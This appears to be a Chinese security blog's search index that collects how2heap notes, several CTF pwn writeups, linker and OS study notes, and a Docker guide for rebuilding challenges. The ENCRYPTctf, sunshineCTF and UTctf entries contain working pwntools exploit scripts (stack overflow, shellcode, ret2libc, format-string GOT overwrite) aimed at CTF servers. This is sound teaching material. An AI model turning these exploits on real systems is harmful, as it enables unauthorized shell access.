参考： https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ https://go-madhat.github.io/9447_heap_search-writeup/]]></content>
      <tags>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[first fit]]></title>
    <url>%2F2019%2F04%2F13%2Ffirst-fit%2F</url>
    <content type="text"><![CDATA[how2heap学习记录 First fit：Allocate the first chunk that is big enough first_fit.c 分析查看first_fit.c的源码可以看到主要进行了申请内存、释放内存再申请内存的三步操作。通过打印指向各个chunk的指针来说明first_fit到底是怎么运作的。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"); fprintf(stderr, "glibc uses a first-fit algorithm to select a free chunk.\n"); fprintf(stderr, "If a chunk is free and large enough, malloc will select this chunk.\n"); fprintf(stderr, "This can be exploited in a use-after-free situation.\n"); fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n"); char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, "1st malloc(512): %p\n", a); fprintf(stderr, "2nd malloc(256): %p\n", b); fprintf(stderr, "we could continue mallocing here...\n"); fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n"); strcpy(a, "this is A!"); fprintf(stderr, "first allocation %p points to %s\n", a, a); fprintf(stderr, "Freeing the first one...\n"); free(a); fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a); fprintf(stderr, "So, let's allocate 500 bytes\n"); c = malloc(500); fprintf(stderr, "3rd malloc(500): %p\n", c); fprintf(stderr, "And put a different string here, \"this is C!\"\n"); strcpy(c, "this is C!"); fprintf(stderr, "3rd allocation %p points to %s\n", c, c); fprintf(stderr, "first allocation %p points to %s\n", a, a); fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");&#125; 整个过程示意图如下： +------------+ +------------+ +-------------+ | | | | | | | | | | | | | | | | | 500 | | 512 | | (free) | | | | | | 512 | +-------------+ | | +-----&gt; | | +-----&gt; | (free)12 | +------------+ +------------+ +-------------+ | | | | | | | 256 | | 256 | | 256 | | | +-----&gt; | | +-----&gt; | | +------------+ +------------+ +-------------+ | | | | | | | | | | | | | ... | | ... | | ... | + + + + + + 因为free chunk中的第一个chunk大小(512)大于申请的chunk大小(500)所以根据first_fit算法，这个512大小的chunk将被分为两部分，一部分返回给用户，大小为500，另一部分依旧留在unsorted bin的双链表结构中。 下面再举一个例子： 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()&#123; char *a = malloc(0x200); char *b = malloc(0x200); char *c = malloc(0x100); char *d = malloc(0x100); char *e = malloc(0x300); fprintf(stderr, "a: %p\n",a); fprintf(stderr, "b: %p\n",b); fprintf(stderr, "c: %p\n",c); fprintf(stderr, "d: %p\n",d); fprintf(stderr, "e: %p\n",e); free(a); free(c); free(e); fprintf(stderr, "----------after free----------\n"); char *f = malloc(0x150); char *g = malloc(0x150); char *h = malloc(0x100); fprintf(stderr, "f: %p\n",f); fprintf(stderr, "g: %p\n",g); fprintf(stderr, "h: %p\n",h); return 0;&#125; 得到的结果： a: 0x869d008 b: 0x869d210 c: 0x869d418 d: 0x869d520 e: 0x869d628 ----------after free---------- f: 0x869d008 g: 0x869d628 h: 0x869d418 申请f chunk时，第一个0x200的chunk大小满足要求，所以使用了第一个a chunk 申请g chunk时，从上到下依次搜索free chunk中只有e chunk大小满足要求，所以申请到了e chunk 申请h chunk时，虽然这时e chunk中还剩余0x1b的空间，但由于first_fit，最先搜索到并满足条件的是c chunk，所以h申请到了c chunk。 示意图如下： +----------+ +----------+ | | | | | (free) | f: | 0x150 | a: | 0x200 | +----------+ | | |(free)0xb0| +----------+ +----------+ | | | | b: | 0x200 | | 0x200 | | | | | | | +--&gt; | | +----------+ +----------+ c: | (free) | | | | 0x100 | h: | 0x100 | +----------+ +----------+ d: | | | | | 0x100 | | 0x100 | +----------+ +----------+ | | | | | | | 0x150 | e: | (free) | +----------+ | 0x300 | | | | | g: | (free) | | | | 0x1b0 | +----------+ +----------+]]></content>
      <tags>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ENCRYPTctf]]></title>
    <url>%2F2019%2F04%2F03%2FENCRYPTctf%2F</url>
    <content type="text"><![CDATA[总算碰到一次比较简单的ctf，哭了。 考察类型：常规栈溢出，leak libc，格式化字符串。 pwn0admin：nope, no hint. 溢出s，覆盖s1。 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH!gh pwn1 计算偏移，覆盖返回值为shell地址 坑点在于ebp后面并不是直接跟着ret地址，进gdb可以看到ebp和ret之间有12字节偏移。 1234567891011121314from pwn import *context.log_level = 'debug'r = remote('104.154.106.182', 2345)r.recv()shell_addr = 0x080484ADpayload = 'a'*0x80 + 'a'*12 + p32(shell_addr)r.sendline(payload)r.interactive() pwn2常规检查 题目给了一个只能执行ls的假shell，没什么用 找gadgets的时候发现一个jmp esp，加上题目没开NX，所以就ret2shellcode了。 1234567891011121314151617from pwn import *context.log_level = &apos;debug&apos;r = remote(&apos;104.154.106.182&apos;, 3456)r.recv()jmp_esp = 0x08048544shellcode = &apos;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&apos;payload = &apos;a&apos;*0x20 + &apos;a&apos;*12 + p32(jmp_esp) + shellcoder.sendline(payload)r.interactive() pwn3 这次开了NX，所以想到ret2libc，但是没有system和binsh的地址，所以需要leak。 思路： 利用题目本身的puts打印出plt.got表中函数的真实地址，在libc-database中找到对应libc库的版本，从而通过计算偏移找到system和binsh的地址，最后ret2libc。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'r = remote('104.154.106.182', 4567)r.recv()main = 0x0804847Dputs_plt = 0x08048340gets_got = 0x080497ACgets_off = 0x00064e60system_off = 0x00040310binsh_off = 0x162d4c#find gets_addr and then return to mainpayload = 'a'*0x80 + 'a'*12 + p32(puts_plt) + p32(main) + p32(gets_got)r.sendline(payload)#the low 12bit of gets_addr could help us find it's libc version and func_offset which is all we needgets_addr = int(hex(u32(r.recv()[:4])), 16)log.success('gets_addr: '+str(hex(gets_addr)))#calc the address of systemlibc_base = gets_addr - gets_offsystem_addr = libc_base+ system_offbinsh_addr = libc_base + binsh_offlog.success('system_addr: '+str(hex(system_addr)))log.success('binsh_addr: '+str(hex(binsh_addr)))#the last overflowpayload = 'a'*0x80 + 'a'*4 + p32(system_addr) + 'aaaa' + p32(binsh_addr)r.sendline(payload)r.interactive() pwn4 明显的格式化字符串漏洞。 一开始函数地址找错了一直拿不到flag，以为构造的payload有问题，差点怀疑人生。 思路： 先是找到printf的got.plt表的地址，利用漏洞将其覆盖为题目提供的拿shell函数地址。 偏移的计算办法：%x.找偏移，有错位就添几个字节补齐，用$[OFFSET]定位偏移后再用%[PADDING]x填充padding个字节，最后用%hhn将前面所有字节个数写入目标地址的单个字节。 若目标地址单个字节大小小于已写入字节数，则采用溢出：+0x100-目标值 嗯对，就是这个地址。一开始找到plt表去了。 1234567891011121314151617from pwn import *context.log_level = 'debug'r = remote('104.154.106.182', 5678)r.recv()shell_addr = 0x0804853Dprintf_got = 0x80498fcpayload = '\xfc\x98\x04\x08'+ '\xfd\x98\x04\x08' + \ '\xfe\x98\x04\x08' + '\xff\x98\x04\x08' + \ '%45x%7$hhn' + '%72x%8$hhn' + '%127x%9$hhn' + '%4x%10$hhn'r.sendline(payload)r.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sunshineCTF]]></title>
    <url>%2F2019%2F04%2F01%2FsunshineCTF%2F</url>
    <content type="text"><![CDATA[return-to-mania 和 CyberRumble，考察普通溢出，还有脑洞。。。。 return-to-mania 没开canary，好说 进来，看到给出了welcome地址，所以pie相当于没开。 思路：通过偏移计算出maina的地址，覆盖welcome返回地址，拿到flag 123456789101112131415161718from pwn import *context.log_level = &apos;debug&apos;r = remote(&apos;ret.sunshinectf.org&apos;,4301)r.recvuntil(&apos;(): &apos;)mania_addr = int(r.recvuntil(&apos;\n&apos;)[:7]+&apos;65d&apos;, 16)print(hex(mania_addr))payload = &apos;a&apos;*0x12 + &apos;aaaa&apos; + p32(mania_addr) r.sendline(payload)print(r.recv())print(r.recv()) CyberRumble全开- - 整个main由几个不同功能的函数构成，排除掉没什么用的函数，分析一下剩下的几个比较有意思的函数。 输入每个函数对应的字符串后面加上自己的参数就可以自己选择函数进入了 tombstone_piledriver：这个函数将参数作为文件打开，读取其内容并返回给用户。自然想到用来打开flag.txt，可是发现无论如何只能打印flag的前一个单词，所以没办法用它来拿flag。 old_school：这个函数接收一串shellcode并返回该shellcode的地址，同时通过mprotect(dest, len, 1);将其权限设置为只读。所以我们并不能直接用这个函数来执行我们的shellcode。 last_ride：接收一串shellcommand，并运行。如果我们输入诸如sh之类的shellcommand，发现执行不了，仔细查看伪代码会发现这里有个小漏洞，传给system的参数并不是shellcommand的地址，而是直接将shellcommand传过去了。由此可以联想到通过old_school放置我们想要执行的shellcommand，再将其地址作为参数传给last_ride。 还有一个小细节需要注意，就是old_schoolmmap的一块新地址的最后12bit是0，直接使用该地址会导致我们的地址被\x00截断，所以部署shellcommand之前要一小块padding。 123456789101112131415161718192021222324from pwn import *context.log_level = 'debug'r = remote('rumble.sunshinectf.org',4300)shellcode_ = 'old_school 'shellcommand = 'last_ride 'r.recvuntil('&gt; ')r.sendline('old_school ash')addr = int(r.recvuntil('.\n')[-16:-2], 16) + 1print(hex(addr))r.recvuntil('[y/n] ')r.sendline('U')r.sendline('last_ride ' + p64(addr))r.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UTctf2019]]></title>
    <url>%2F2019%2F03%2F13%2FUTctf2019%2F</url>
    <content type="text"><![CDATA[两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc 这周末连着两个比赛，酸爽。 pwnbabypwndocker环境： docker pull muirelle/utctf:pwn 想复杂了。老是想着ret2libc，结果discord一个老哥提醒global vireable还是没想起来利用bss段存放shellcode。 保护基本上都没开 接下来是三个主要的函数。 注意到welcome和do_calc都可以通过gets进行栈溢出。 而name位于bss段，可以将shellcode放在这里，然后劫持do_calc流程跳转到这里执行shellcode。 从shellstrom上找了一个x64的execve(‘/bin/sh’) \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05 再回来看do_calc函数流程： 1、输入运算符 2、输入第一个操作数(nptr) //[rsp+40h] [rbp-50h] 3、输入第二个操作数(v1) //[rsp+0h] [rbp-90h] 4、依次判断第一步输入的运算符是否是 + , - , * 。若是就直接进行运算然后返回。 由于nptr离栈底比较近所以选择nptr进行溢出。在溢出的过程中会覆盖v5的值，所以要计算好v5的位置，然后覆盖为运算符。 计算偏移：0x50-1 = 0x4f 12345678910111213from pwn import *p = remote("stack.overflow.fail", 9000)shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'p.sendline(shellcode)p.sendline("*")payload = "a"*0x4f + "*" + p64(0x601080) #bssp.sendline(payload)p.sendline("asdf")p.interactive() babyechoDocker环境：docker pull muirelle/utctf:babyecho 通过这道题好好学习一下泄露libc地址的办法 常规检查 可以看到printf有明显的格式化字符串漏洞 但是并没有现成的system函数给我们利用，所以思路应该是通过格式化字符串泄露某个函数的在libc中的真实地址，通过工具libc-database找到libc基址，从而计算出system的地址。然后再考虑如何利用system达到getshell的目的。 构造循环 首先，如果我们直接一来就利用printf泄露某个函数的地址的话，泄露完成后就会直接执行exit函数，这个漏洞只能被利用一次。 如果利用这个漏洞将exit的got表覆盖为main函数的地址，就可以构造出一个循环，在执行exit的时候实际是跳转回了main函数，从而多次利用漏洞。 objdump -dj .plt pwnable先找到exit(0x804a01c) 然后是main(0x804851b) 再找到偏移 %n写入4个字节 %hn写入2个字节 %hhn写入1个字节 (python -c &#39;print &quot;AA&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;\x1d\xa0\x04\x08&quot; + &quot;%17x%11$hhn%106x%12$hhn&quot;&#39; ;cat -) | ./pwnable 经过多次尝试之后找到了偏移为第11个参数。 可以看到已经覆盖了exit的地址为main，所以输入完了之后会回到main重新打印提示信息。所以我们现在可以多次利用这个漏洞了！ 泄露libc 由于我们不能在got表中直接找到system的地址，所以要通过泄露libc基址的方式计算出system的地址。但运行这个文件的时候所有libc函数都是动态连接的，所以所有libc函数的地址都经过aslr随机化了。可是aslr只会将基址随机化，也就是说每个函数之间的相对偏移是不变的，如果能泄露出某个函数的地址，就能找到对应的libc版本，从而得到libc基址，进而知道每个函数的偏移量，最后计算出system的地址。 现在的问题就是如何泄露某个函数的地址。 我们知道当libc函数被调用之后，其got表相应的位置就会被替换为此函数在libc中真实的地址，所以如果我们可以泄露某个函数got表内的值，就能得到此函数的地址。但是%x和%p只能泄露栈上的地址，但是我们知道，%s可以打印对应地址的内容，再加上我们已经在上一步中有了任意位置写的能力，所以现在利用%s就可以任意位置读了。 现在试着读取一下puts的地址： 成功得到了puts的真实地址0xb75c5ca0(每次运行这个地址都是会变化的，但是低12位不变)，接下来用libc-database工具查询一下对应的libc 得到了puts偏移0x0005fca0，同时也得到了system偏移(0x0003ada0) 所以libc基址 = puts地址 - puts偏移system地址 = libc基址 + system偏移 劫持流程 接下来要做的就是利用system来getshell。首先要考虑一下如何给system传递参数’/bin/sh’，因为没有/bin/sh拿到system也没用。 注意到程序中调用了printf函数，而printf函数需要一个参数，这个参数刚好是由fgets从用户读取的输入，也就是说如果我们将printf的got表内容覆盖为system的地址，再利用fgets输入/bin/sh，那么在调用printf(&#39;/bin/sh&#39;)时实际调用的则是system(&#39;/bin/sh&#39;)，进而拿到shell。 覆盖printf的地址分为三步，每次覆盖一个字节。 现在要考虑的问题是，每次得到的system地址都是不同的，在高位地址值小于地位地址值的时候如何才能保证将printf正确覆盖为system呢？利用高位溢出。 比如system地址为0xb7620da0，覆盖了一个字节为0xa0后，想要覆盖第二个字节为0x0d，但是前面已打印的字节数明显已经大于0x0d了，这时就用高位溢出来得到0x0d： 这时需要填充的字节为：0x100 - 0xa0 + 0x0d = 0x6d 若后面出现这种情况同理利用高位溢出。 exploit 最后的脚本 from pwn import * #context.log_level = 'debug' p = process('./pwnable') main_addr = 0x0804851B exit_got = 0x0804A01C puts_got = 0x0804A018 p.recv() #creat a loop payload1 = 'AA' + p32(exit_got) + p32(exit_got+1) payload1 += '%17x%11$hhn%106x%12$hhn' p.sendline(payload1) p.recv() #leak libc payload2 = 'AA' + p32(puts_got) payload2 += '%11$s' + 'BB' p.sendline(payload2) puts_addr = int(hex(u32(p.recvuntil('BB')[6:10]))[-8:],16) log.success('puts_addr: ' + hex(puts_addr)) puts_off = 0x0005fca0 system_off = 0x0003ada0 libc_base = puts_addr - puts_off system_addr = libc_base + system_off log.success('system_addr: ' + hex(system_addr)) #overwrite printf part1 printf_got = 0x0804A010 payload3 = 'AA' + p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) overwrite1 = int(hex(system_addr)[-2:], 16) log.success('try overwrite1: ' + hex(overwrite1)) #overwrite printf part2 try_overwrite2 = int(hex(system_addr)[-4:-2], 16) log.success('try overwrite2: ' + hex(try_overwrite2)) if(try_overwrite2 &lt; overwrite1): overwrite2 = 0x100 - overwrite1 + try_overwrite2 else: overwrite2 = try_overwrite2 - overwrite1 payload3 += '%' + str(overwrite2) + 'x' + '%12$hhn' log.success('overwrite2: ' + hex(overwrite2)) #overwrite printf part3 try_overwrite3 = int(hex(system_addr)[-6:-4], 16) log.success('try overwrite3: ' + hex(try_overwrite3)) if(try_overwrite3 &lt; try_overwrite2): overwrite3 = 0x100 - try_overwrite2 + try_overwrite3 else: overwrite3 = try_overwrite3 - try_overwrite2 payload3 += '%' + str(overwrite3) + 'x' + '%13$hhn' log.success('overwrite3: ' + hex(overwrite3)) log.success('payload3: ' + payload3) #get shell p.sendline(payload3) p.sendline('/bin/sh') p.interactive() 拿到shell 参考： https://github.com/D4nch3n/Cyber-Competitions/blob/master/UTCTF/Babyecho/README.md 格式化字符串]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔]]></title>
    <url>%2F2019%2F03%2F08%2F%E9%9A%8F%E7%AC%94%2F</url>
    <content type="text"><![CDATA[一些笔记 2019/3/8 特殊符号、符号修饰…特殊符号 使用ld进行链接时，会在链接脚本中生成一些特殊符号。连接器在最终将程序链接成可执行文件时将其解析为正确的值。 __executable_start，该符号为程序起始地址（并非入口地址），比如0x8048000。 __etext，该符号为代码段结束地址，如0x80484d4。 _edata，该符号为数据段结束地址，如0x804963c。 _end，该符号为程序结束地址，如0x80496640。等等。 可以在程序中直接使用这些符号，如：printf(“executable start %x\n”, __executable_start); c++符号修饰 为了支持c++的函数重载，命名空间等可能导致函数重名特性，引入了符号修饰的机制。 为此，每个函数都有一个独一无二的函数签名，包含了这个函数的各种信息（函数名，参数类型，所在的类名，命名空间等其他信息）。 gcc基本c++的名称修饰方法：所有符号以_Z开头，对于嵌套的名字（在命名空间或类中）后面紧跟“N”，然后依次在后面跟上从外层到内层的名字长度加名字，最后以E结尾。 比如：mynamespace::myclass::func经过修饰后变为_ZN11mynamespace7myclass4funcE 并且E后面跟上参数列表，如果int型就跟 i， 最后变为_ZN11mynamespace7myclass4funcEi c++包含c符号时避免符号修饰 若c++代码包含c函数库的某个函数，则会将其当做c++函数并对其进行符号修饰，导致链接器无法将此符号与c库链接。 解决办法：条件宏判断配合c++宏__cplusplus 例如： 123456789#ifdef __cplusplusextern "C"&#123;#endifvoid *memset(void *, int ,size_t);#ifdef __cplusplus&#125;#endif ——《程序员的自我修养》 2019/3/11 两步链接第一步：空间与地址分配 扫描所有输入目标文件，获取各个段的长度，属性和位置，并将输入目标文件中的符号表中所有的符号定义和符号引用统一放到全局符号表。这一步中，链接器能获得所有输入目标文件的段长度，并将他们合并，计算输出文件各个段合并后的长度与位置，并建立映射关系。 第二步：符号解析与重定位 使用上一步收集到的信息，读取输入文件中段的数据、重定位信息，并进行符号解析和重定位、调整代码中的地址等。此过程特别是重定位过程是整个链接过程的核心。 ——《程序员的自我修养》 2019/3/13 C ??!??! operatorc语言 ??!??! 运算符是啥鬼？ https://stackoverflow.com/questions/7825055/what-does-the-c-operator-do 逛一圈so总能学点新东西\滑稽。 2019/3/17 链接过程比喻如果把整个链接过程比作一台计算机，那么ld链接器就是计算机的cpu，所有的目标文件、库文件就是输入，链接结果输出的可执行文件就是输出，而链接控制脚本正是这台计算机的“程序”，它控制cpu的运行，以“程序”要求的方式将输入加工成所需要的输出结果。 ——《程序员的自我修养》 2019/3/18 可执行文件的装载可执行文件的装载 最开始可分为三步： 创建一个独立的虚拟地址空间 读取可执行文件头，以页为单位建立虚拟地址空间与可执行文件的映射 cpu的指令指向可执行文件入口，启动运行 创建虚拟地址空间时并不会立即将其各个页映射到相应的物理地址，实际上只是创建了一个页目录，等到运行程序触发页错误时才会向物理地址申请相关页并进行映射。 系统从可执行文件中读取头部各个段(section)的信息，然后将其映射到虚拟空间的相应位置，虚拟空间中的一个段叫做虚拟内存区域(VMA,Virtual Memory Area)。 通过设置指令寄存器指向可执行文件入口，将控制权转交给进程。 虚拟内存的分布 在第二步将可执行文件地址映射到虚拟空间时，由于存在页对齐机制，如果直接把每个段按页映射到虚拟空间就会造成空间浪费的问题。比如一个页大小规定为4KiB，有一个可执行文件有10个段，每个段都只有不到1KiB，但是在进行映射时每个段都要独自占用一个页，这样就造成了空间的极大浪费。所以自然会有方法来解决这种浪费。 操作系统装载可执行文件时并不关心各个段包含的内容，而是关心一些跟装载相关的问题，主要是段的权限。(如读，写，运行权限)。所以，对于具有相同权限的段(section)，把他们合并到一起进行映射(如 .text和.rodata)。 这种合并到一起具有多个section的段被称为segment。把这一个segment映射到虚拟空间中就只有一个与其对应的VMA，从而减少了碎片，节省了内存空间。 区分section和segmentsection是链接视图，segment是装载视图 在链接过程中，链接器需要将每一个section信息提取出来，为之后的重定位工作做准备。(可用readelf -S file查看) 而在装载的过程中，系统只关心section的属性，把它们整合成segment后映射到同一个VMA。为之后的创建进程映像做准备。(可用readelf -l file查看) 参考 : https://stackoverflow.com/questions/23379880/difference-between-program-header-and-section-header-in-elf https://venkateshabbarapu.blogspot.com/2012/09/process-segments-and-vma.html ——《程序员的自我修养》 2019/3/23 interrupt and system callWhat’s the difference between interrupt and system call? System calls: issued by user processes to request system services Interrupts: raised by decices to get OS attention a interrupt usually caused by external hardware and a system call can also trigger an interrupt(soft interrupt) https://stackoverflow.com/questions/33654579/in-an-operating-system-what-is-the-difference-between-a-system-call-and-an-inte/33654831 2019/3/29 C static 关键字限定对象作用域如果在程序中给声明的对象前加了static关键字，则此对象对外不可见。 例子： foo.c 12345678#include&lt;stdio.h&gt;int main()&#123; int a = 4; bar(a); return 0;&#125; bar.c 123456#include&lt;stdio.h&gt;static void bar(int a)&#123; printf("%d\n",a);&#125; 编译 gcc -o fb foo.c bar.c 运行 123/tmp/cckqp3JI.o: In function `main&apos;:foo.c:(.text+0x1a): undefined reference to `bar&apos;collect2: error: ld returned 1 exit status 出错 这就是因为添加了static关键字导致bar函数对外不可见，所以编译时报出未定义的错误。不止函数，在变量前添加static也可以对外不可见。 顺便一提在编译时遇到警告： 123foo.c:6:2: warning: implicit declaration of function ‘bar’ [-Wimplicit-function-declaration] bar(a); ^~~ 是由于在foo开头未对bar函数进行声明。 在前面加上 extern void bar(int a); 即可消除警告。 ——《c程序设计语言》 2019/4/1 处理可变长参数表——va_list形如type func(type arg1, ...)的函数声明，结尾的省略号表示该函数包含一个可变长的参数列表。比如printf就是这样定义的：int printf(char *fmt, ...)要遍历这些参数需要用到头文件&lt;stdarg.h&gt;中的一组宏定义。 va_list类型用于声明一个变量，改变量将依次引用各参数。暂定该变量名为ap，意思是“参数指针”。宏va_start将ap初始化为指向第一个无名参数的指针。在使用ap之前，该宏必须被调用一次。参数表必须至少包括一个有名参数作为起点。每次调用va_arg，该函数都将返回一个参数，并将ap指向下一个参数。va_arg使用一个类型名来决定返回的对象类型、指针移动和步长。最后，必须在函数返回之前调用va_end，以完成一些必要的清理工作。 ——《c程序设计语言》 2019/5/8 实模式和保护模式8086芯片的工作模式为实模式。在实模式下，程序可以直接读写任意地址的内存，所以无法保证安全性。 8086有16条数据线和20条地址线。在寻址时，cpu给出16位的段地址和16位的偏移地址，内部总线将两个地址送入加法器中进行段地址×0x10 + 偏移地址 计算出20位的实际物理地址。 20位最多能达到1M的寻址能力，但通过段地址×0x10 + 偏移地址能达到的最大地址为 0xffff×0x10 + 0xffff ＝ 0xffff0 + 0xffff ＝ 0x10ffef 所以超出了1M的地址范围，但8086具有回卷机制（warp around），所以访问超过范围的地址并不会引发错误，而是从零开始继续计算地址。所以可以看成地址是对0x10000取模。 从80286开始加入了保护模式，保护模式将访问内存的权限分成0-3，4个等级，0为最高权限，具有直接控制和访问硬件的能力，数字越大代表权限越低。 80286拥有16条数据线和24条地址线，达到了2^24即最大16M的寻址能力。80286也有实模式，即只使用低20位地址线。但此时有一个问题：在使用实模式时，如果访问大于1M地址的内存，此时不会发生回卷，因为80286实际存在这些地址，并且会访问到这些地址，为了和8086保持兼容，采用的方法是将键盘上多余的一根线和A20（即第21根地址线）做与运算，为0时关闭，为1时打开。则当A20关闭时，程序就无法访问0x100000～0x10ffef间的内存。 2019/5/9 分段机制8086中为了解决16根数据线对20根地址线的寻址问题，采用了分段机制，即段地址×0x10 + 偏移来寻址。段地址（基址）由CS，DS，ES，SS等段寄存器给出，再加上cpu给出的偏移地址计算出最终内存中的物理地址。 在IA-32体系中，为了保持向下兼容，也使用分段机制，虽然后面可以用分页机制替代，但分页机制也是建立在分段机制的基础上的。IA-32分段寻址模式较8086有所不同。首先，使用分段机制的原因有很多，主要是为了方便管理内存和安全性考虑。分段机制将程序员使用的逻辑地址转化为线性地址，整个过程大致如下： 将16位段寄存器（如DS）中的值取出作为段选择子。 由段选择子中保存的信息选择内存中全局描述符表（GDT）中对应的段描述符。可以理解为在一个数组（GDT）中通过INDEX（段选择子）找到对应元素（段描述符）。 段描述符中保存了该段的各种信息，包括基址，最大偏移，特权级等等，经过一系列判断，若该次访问满足条件（如判断偏移是否超过最大偏移、权限是否高于或等于需要的权限）则从段描述符中取出基址，与偏移相加，计算出线性地址，线性地址即物理地址。这就是段式内存管理。 段选择子段选择子用来选择全局描述表中的段描述符。由索引(高13位)，表指示位(1位，用于指示选择的表是GDT还是LDT)，请求特权级(2位)组成。 段描述符用于划分每一个段的段描述符一起组成了段描述符表，就像数组和元素的关系。每一个段描述符由三个参数(段基地址，段界限和段属性)进行定义。 全局描述符表（GDT）全局描述符表是用于定义和划分不同内存区域的数据结构：段的基址，大小和特权级等。这些被划分的内存区域被叫做段。 2019/5/19 中断机制80386芯片保护模式下处理中断过程： cpu接收到中断信号(如中断控制器8259A提供的中断信息、系统调用产生的中断信息(trap)、系统故障产生的中断信息(fault))。 cpu通过该中断号和中断描述符表寄存器(IDTR)的值找到该中断号在中断描述符表(IDT)中相应的中断门描述符(Gate Descriptor) cpu通过中断门描述符中的段选择子找到全局描述符表(GDT)中相应的段描述符，再将段描述符中相应段的基址加上中断门描述符中的偏移得到中断服务例程的起始地址。 检查特权级并判断是否需要有特权级别转换。若当前程序运行在用户态，而中断服务例程需要在内核态运行，此时就会转换到内核栈并将用户态的ss和esp压栈保存下来。接着保护现场(依次将当前各个寄存器的值压栈) 中断服务例程的地址被加载到cs，eip中，开始执行中断服务例程 中断门描述符大小为8个字节，包含了该中断号对应的中断服务例程(ISR,Inerrupt Service Routine)所在段的段选择子(这里的段选择子就是GDT中的段选择子，用来选择GDT中的段描述符)和偏移，还有特权级等其他信息。]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用docker复现ctf题目]]></title>
    <url>%2F2019%2F03%2F07%2F%E4%BD%BF%E7%94%A8docker%E5%A4%8D%E7%8E%B0ctf%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[之前弄很久都没搞懂该怎么复现ctf题目，直到TAUMctfwp给了docker的环境才慢慢仿照dockerfile学会了怎么在本地复现题目。 官方文档 docker安装ubuntu：https://docs.docker.com/install/linux/docker-ce/ubuntu/ windows：https://hub.docker.com/editions/community/docker-ce-desktop-windows 安装window版要确保自己的windows是专业版并开启Hyper-V功能以兼容win版docker。 如果是windows家庭版去买个激活码升级一下就行了。 docker基础操作镜像(image) 查看本机镜像docker image ls 或 docker images 删除镜像docker image rm [imageName] 拉取镜像(以官方提供的hello-world镜像为例)docker image pull library/hello-world 容器(container) 查看本机正在运行的容器，加上参数-all查看包括已停止的所有容器docker container ls 运行容器docker container run hello-world若本地没有指定的镜像，则会自动拉取。 删除容器docker container rm [CONTAINER ID] Dockerfile 如果要制作自己的镜像就需要用到Dockerfile配置镜像。 以TAUMctf的一道题给出的Dockerfile为例 12345678910111213141516171819202122232425262728293031323334FROM ubuntu:16.04 #该 image 文件继承官方的 ubuntu image，冒号表示标签，即16.04版本的ubuntu#RUN命令在创建镜像时被执行RUN apt update --fix-missing #更新源RUN apt install -y socat 安装socat网络工具RUN groupadd ctf #创建一个新的用户组RUN mkdir /rev #在根目录创建一个文件夹#COPY命令将Dockerfile所在文件夹的指定文件复制到镜像中的指定位置COPY simple /rev/simple COPY flag.txt /rev/flag.txtRUN useradd -G ctf --home=/rev revuserRUN useradd -G ctf --home=/rev revflag #添加属于ctf组的用户RUN chown revflag:revflag /rev/flag.txtRUN chown revflag:revflag /rev/simple #设置文件拥有者RUN chmod 4755 /rev/simple #可执行权限设置为sRUN chmod 444 /rev/flag.txtEXPOSE 7223 #开放7223端口#CMD命令在容器运行时执行，并且一个Dockerfile只能有一个CMD命令CMD [&quot;su&quot;, &quot;-c&quot;, &quot;exec socat TCP-LISTEN:7223,reuseaddr,fork EXEC:/rev/simple,stderr&quot;, &quot;-&quot;, &quot;revuser&quot;]#TCP4-LISTEN 在本地建立的是一个TCP ipv4协议的监听端口#reuseaddr 绑定本地一个端口#fork 设定多链接模式，即当一个链接被建立后，自动复制一个同样的端口再进行监听 搭建环境创建image 把Dockerfile需要的文件放在Dockerfile所在文件夹内。 docker image build -t [imageName]:[tag] .使用上面命令创建image文件，-t用于指定image的名字，tag可选。 如： docker image build -t advkeygen . 生成容器 docker container run -p 8000:7223 -it --rm advkeygen 这个命令令从advkeygen镜像生成一个容器 -p用来指明映射端口，上述命令将本地8000端口映射到容器的7223端口。若使用-P参数则会由系统自动分配端口，可以使用docker container ls查看具体映射的端口。 -it容器的shell映射到当前shell，本机窗口输入的命令会传入容器。 --rm参数在容器停止运行后自动删除容器。 发布image确定容器可以运行之后就可以发布到网上，方便随时取用。 官网：hub.docker.com 注册后用命令docker login登录。 docker image tag [imgeName] [username]/[repository]:[tag] 